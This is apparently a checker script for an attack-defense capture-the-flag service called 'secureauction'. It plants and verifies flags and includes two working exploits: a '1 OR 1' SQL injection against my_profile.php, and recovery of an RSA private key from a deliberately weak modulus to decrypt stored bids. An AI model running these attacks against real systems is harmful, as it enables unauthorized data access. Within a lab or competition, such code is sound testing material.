from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import re
import faker
from httpx import AsyncClient, Response
from typing import Optional
from logging import LoggerAdapter
import sympy 
import gmpy2
from sympy import *
from bs4 import BeautifulSoup
import urllib.parse
from typing import Tuple, Optional

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

import logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)


checker = Enochecker("secureauction", 8181)
app = lambda: checker.app


async def signup(client: AsyncClient, user_name, password, user_type='REGULAR'):
    logger.info(f"Starting signup process for user: {user_name}")
    signup_data = {
        "user_name": user_name,
        "password": password,
        "user_type": user_type,
        "action": "signup"
    }
    response = await client.post("index.php", data=signup_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for signup process")
    
    if status_code in [200,302]:
        # Check if a redirection occurred
        if 'Location' in response.headers:
            new_url = response.headers['Location']
            response = await client.get(new_url)  # Fetch the redirected page
            status_code = response.status_code
            logger.info(f"Received status code {status_code} for redirected page")

        logger.debug(f"Signup response HTML: {response.text}")
        if user_type == 'PREMIUM':
            # Parse the private key and user_id from the response
            soup = BeautifulSoup(response.text, 'html.parser')
            logger.debug(f"Signup response parsed HTML: {soup.prettify()}")
            
            private_key_elements = soup.find_all('p', class_='key-chunk')
            private_key = ''.join(element.text for element in private_key_elements)
            
            user_id_element = soup.find('input', id='userId')
            user_id = user_id_element['value'] if user_id_element else None # type: ignore
            
            logger.info(f"Parsed private key: {private_key} and user_id: {user_id}")
            return private_key, user_id
        
        elif user_type == 'REGULAR':   
            return 
        else: 
            logger.error(f"Invalid user type: {user_type}")
    else:
        logger.error(f"Failed to sign up the user. {status_code}")
        raise MumbleException(f"Failed to sign up the user. {status_code}")


async def login(client: AsyncClient, user_name, password, user_type='REGULAR'):
    logger.info(f"Starting login process for user: {user_name}")
    login_data = {
        "user_name": user_name,
        "password": password,
        "user_type": user_type,
        "action": "login"
    }
    response = await client.post("index.php", data=login_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for login process")
    if status_code != 302:
        logger.error(f"Failed to log in the user. {status_code}")
        raise MumbleException(f"Failed to log in the user. {status_code}")
    else:
        logger.info(f"Successfully logged in the user: {user_name}")
        return user_name


async def create_item(client: AsyncClient, item_name, start_price, item_type='REGULAR') -> Tuple[int, Optional[str]]:
    logger.info(f"Attempting to create item: {item_name}")
    item_data = {
        "item_name": item_name,
        "start_price": start_price,
        "item_type": item_type
    }
    logger.debug(f"Item data: {item_data}")  # Logging the item_data
    response = await client.post("create_item.php", data=item_data)
    logger.debug(f"Create item response: {response.text}")

    if response.status_code  == 302:
        redirect_uri = response.headers['Location']
        logger.debug(f"Redirect URI: {redirect_uri}")
        parsed_url = urllib.parse.urlparse(redirect_uri)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        item_id = int(query_params.get('id')[0]) # type: ignore
        encrypted_amount = query_params.get('encryptedAmount', [None])[0]
        return item_id, encrypted_amount
    else:
        logger.error(f"Failed to create the item. Status code: {response.status_code}")
        raise MumbleException("Failed to create the item.")


async def bisect(f, low, up, rounding = 0):
    flow = f(low)
    fup = f(up)
    if flow == 0: return low
    if fup == 0: return up
    if flow * fup > 0: raise ValueError('bad interval')
    if flow < 0:
        return await _bisect(f, low,up,rounding)
    else:
        return await _bisect(lambda x: -f(x), low, up,rounding)


async def _bisect(f, low, up, rounding):
    if up <= low + 1:
        if rounding == 1:
            return up
        elif rounding == -1:
            return low
        else:
            raise ValueError('no root or bad function')
    mid = (low + up) // 2
    midval = f(mid)
    if midval == 0: return mid
    if midval < 0: return await _bisect(f, mid, up, rounding)
    if midval > 0: return await _bisect(f, low, mid, rounding)



async def calculate_d(p, q, e, rounding = 0):
    # Calculate the totient φ(n) = (p - 1)(q - 1)
    phi_n = (p - 1) * (q - 1)

    # Calculate d, the modular inverse of e under φ(n)
    d = mod_inverse(e, phi_n)
    return d


async def crack_rsa(e, n):
    # given n and e
    n = n
    e = e
    # log e and n
    logger.info(f"Received e: {e}")
    logger.info(f"Received n: {n}")
    for rounding in [0, 1, -1]: # iterate over desired rounding values
        for offset in range(10,2048,2):
            try:  
                p = await bisect(lambda x: x * (x * (x+10) + offset) - n, 0, 1<<512, rounding = rounding)
                # log calculated p
                logger.info(f"Calculated p: {p}")
                increased_p = p + 10 # type: ignore
                number = p * increased_p
                q = nextprime(number)
                # log calculated q
                logger.info(f"Calculated q: {q}")
                d = await calculate_d(p, q, e, rounding)
                if d is not None:
                        logger.info(f"Calculated d: {d}")
                        return d  # d was found and will be returned
            except ValueError:
                pass
    

async def decrypt(c, d, n):
    # Perform the decryption
    m = gmpy2.powmod(c, d, n)
    # Convert the result to a hexadecimal string
    m_hex = gmpy2.digits(m, 16)
    # Convert the hexadecimal string into a binary string (which is our original message the flag)
    m_string = bytes.fromhex(m_hex).decode('utf-8')
    return m_string


@checker.putflag(1)
async def putflag_note(
        task: PutflagCheckerTaskMessage,
        db: ChainDB,
        client: AsyncClient,
        logger: LoggerAdapter,
) -> str:
    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))

    private_key, user_id = await signup(client, user_name, password, 'PREMIUM') #type: ignore
    item_name = ''.join(random.choices(string.ascii_lowercase, k=10))
     # chose a random item type
    item_type = random.choice(['REGULAR', 'PREMIUM'])
    item_id, encrypted_bid = await create_item(client, item_name, task.flag, item_type) # type: ignore
    
    # storing data in the db to get it later in the getflag
    await db.set("item", (user_name, password, item_name, private_key, user_id, item_id, encrypted_bid))

    # make item_id a string to return it
    return str(item_id)


@checker.getflag(1)
async def getflag_note(
        task: GetflagCheckerTaskMessage,
        db: ChainDB,
        logger: LoggerAdapter,
        client: AsyncClient
) -> None:
    try:
        user_name, password, item_name, private_key_d, user_id, item_id, encrypted_bid = await db.get("item")
        logger.info(
            f"Retrieved item from database: {user_name}, {password}, {item_name}, {private_key_d}, {user_id}, {item_id}, {encrypted_bid}")
    except KeyError:
        logger.error("Item missing from database")
        raise MumbleException("Item missing")

    try:
        user_namee = await login(client, user_name, password, 'PREMIUM')
        # check if the user is logged in

        logger.info(f"Logged in as user: {user_namee}")
    except Exception as e:
        logger.error(f"Error logging in: {e}")
        raise MumbleException("Login error")

    # Post parameters to decrypt_bid.php
    logger.info(
        f"Sending post request to decrypt_bid.php with data: {private_key_d}, {user_id}, {item_id}, {encrypted_bid}")
    try:
        decrypt_response = await client.post("decrypt_bid.php",data={"private_key_d": private_key_d, "user_id": user_id, "item_id": item_id, "amount": encrypted_bid},)
        logger.info(f"Received response from decrypt_bid.php: Status Code: {decrypt_response.status_code}, Content: {decrypt_response.text}")
    except Exception as e:
        logger.error(f"Error sending POST request: {e}")
        raise MumbleException("POST request error")
    
    try:
        assert_in(task.flag, decrypt_response.text, "Flag missing")
        logger.info("Flag found in response")
    except Exception as e:
        logger.error(f"Flag not found item id: {item_id}")
        # log the id of the item
        logger.info(f"Item id: {item_id}")
        # log the flag that was supposed to be found
        logger.info(f"Flag: {task.flag}")
        # log all data that was sent to decrypt_bid.php
        logger.info(f"Data sent to decrypt_bid.php: {private_key_d}, {user_id}, {item_id}, {encrypted_bid}")
        # log decrypted bid amount
        logger.info(f"Decrypted bid amount: {decrypt_response.text}")
        raise MumbleException("Flag missing error")

@checker.putflag(0)
async def putflag_note(
        task: PutflagCheckerTaskMessage,
        db: ChainDB,
        client: AsyncClient,
        logger: LoggerAdapter,
) -> str:
    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))

    await signup(client, user_name, password, 'REGULAR')

    item_name = ''.join(random.choices(string.ascii_lowercase, k=10))

    item_id = await create_item(client, item_name, task.flag,  'REGULAR')
    
    await db.set("item", (user_name, password, item_name))

    return user_name
    

@checker.getflag(0)
async def getflag_note(
        task: GetflagCheckerTaskMessage,
        db: ChainDB,
        logger: LoggerAdapter,
        client: AsyncClient
) -> None:
    try:
        user_name, password, item_name = await db.get("item")
    except KeyError:
        raise MumbleException("Item missing")
    
    await login(client, user_name, password, 'REGULAR')

    response = await client.get(f"my_profile.php")
    logger.debug(response.text)
    assert_in(task.flag, response.text, "Flag missing")


@checker.exploit(0)
async def exploit(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    searcher: FlagSearcher,
    logger: LoggerAdapter  
) -> Optional[str]:

    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))

    logger.debug(f"Generated user_name: {user_name}")
    logger.debug(f"Generated password: {password}")

    await signup(client, user_name, password)

    # SQL Injection payload, returning all records regardless of the user_id.
    SQL_INJECTION_PAYLOAD = "1 OR 1"
    exploit_url = f"/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}"

    response = await client.get(exploit_url)

    logger.debug(f"Exploit response status code: {response.status_code}")

    if response.status_code == 200:
        # look for the flag directly
        if flag := searcher.search_flag(response.text):
            return flag

        else:
            logger.warning("Flag not found in the response.")
    else:
        logger.warning("Exploit request failed.")
        raise MumbleException("Exploit Failed!")
    

@checker.exploit(1)
async def exploit(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    searcher: FlagSearcher,
    logger: LoggerAdapter  
) -> Optional[str]:

    # Generate random username and password
    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))
    logger.info(f"Generated user_name: {user_name}")
    logger.info(f"Generated password: {password}")

    # Register a new premium user and get their private key and user id
    private_key, user_id = await signup(client, user_name, password, 'PREMIUM')  # type: ignore
    logger.info(f"Signed up user: {user_name} with private key: {private_key} and user_id: {user_id}")  

    # Get Attack Info from the task
    item_id = task.attack_info
    logger.info(f"Attack info: {item_id}")

    # Make a post request to the form to get all the details to item we want to exploit
    logger.info(f"Making a POST request to the form to get all the details to item we want to exploit")
    data = {
    'item_id': item_id,
    'submit': 'Search'
    }
    response = await client.post("/user_index.php", data=data)
    if response.status_code == 200:
        logger.info(f"Received response from user_index.php: Status Code: {response.status_code}")
        
        # Parse HTML to extract values
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        # Look for the form with the matching data-item-id
        for form in forms:
            if form.get('data-item-id') == item_id:
                extracted_item_id = form.get('data-item-id') # type: ignore
                name = form.get('data-name') # type: ignore 
                extracted_user_id = form.get('data-user-id') # type: ignore
                start_price = form.get('data-start-price') # type: ignore
                bidamount = form.get('data-bidamount') # type: ignore
                public_key_e = form.get('data-public-key-e') # type: ignore
                public_key_n = form.get('data-public-key-n') # type: ignore

                logger.info(f"Extracted Item ID: {extracted_item_id}, Name: {name}, User ID: {extracted_user_id}, Start Price: {start_price}, Bid Amount: {bidamount}, Public Key E: {public_key_e}, Public Key N: {public_key_n}")
                # Calculate d
                logger.info(f"Calculating d")
                d = await crack_rsa(int(public_key_e), int(public_key_n))
                logger.info(f"Calculated d: {d}")
                # Decrypt the bid amount
                logger.info(f"Decrypting the bid amount")
                decrypted_bid_amount = await decrypt(int(bidamount), d, int(public_key_n))
                logger.info(f"Decrypted bid amount: {decrypted_bid_amount}")
                # Return the decrypted bid amount which is the flag
                return decrypted_bid_amount
                break
        else:
            logger.error("No form found with the item_id.")
    
    else:
        logger.error(f"Received error response from user_index.php: Status Code: {response.status_code}")


    # If no matching flag is found, raise an exception
    logger.warning("Flag not found!")
    raise MumbleException("Exploit Failed!")


if __name__ == "__main__":
    checker.run()